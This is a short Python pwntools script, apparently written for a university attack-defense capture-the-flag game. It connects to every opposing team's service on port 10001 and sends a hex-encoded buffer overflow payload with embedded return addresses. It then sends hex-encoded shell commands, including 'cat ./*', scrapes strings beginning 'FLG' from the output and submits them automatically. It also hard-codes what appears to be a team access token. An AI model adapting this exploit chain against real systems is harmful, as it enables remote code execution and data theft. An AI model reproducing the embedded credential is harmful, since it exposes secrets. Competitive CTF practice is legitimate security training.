from swpag_client import Team
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'debug'

t = Team("http://actf4_team.cse545.io/", "A17sryrF7bFDVR6D4niP")
for team in t.get_targets(1):
    host=team['hostname']
    recipe_id=team['flag_id']
    p=pwn.remote(host,'10001')
    try:
        p.recvuntil('Print Recipe')
        #p.recvline() #"Your choice (1-3): "
        #p.clean()
        p.sendline('P')
        p.recvuntil('password')
        stol="312031323320414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141616a44644141414141414141eb18400000000000431c4000000000001aee15b0267f000050a5ffaf267f00000a"
        base16INT = int(stol, 16)
        hex_value = hex(base16INT)
        p.sendline(hex_value)
        p.recvline()
        stol2="6563686f2068656c6c6f0a"
        base16INT = int(stol2, 16)
        hex_value = hex(base16INT)
        p.sendline(hex_value)
        p.recvuntil('saved!')
        p.recvline()
        stol3="636174202e2f2a202626206563686f20646f6e650a"
        base16INT = int(stol3, 16)
        hex_value = hex(base16INT)
        p.sendline(hex_value)
        #flag=[]

        while True:
            p.recvuntil('FLG')
            fflag=p.recv(13)
            fflag="FLG" + fflag
            #flag.append(fflag)
            print(fflag)
            t.submit_flag([fflag])
    except EOFError as error:
        break

        #im sending dlag at 2122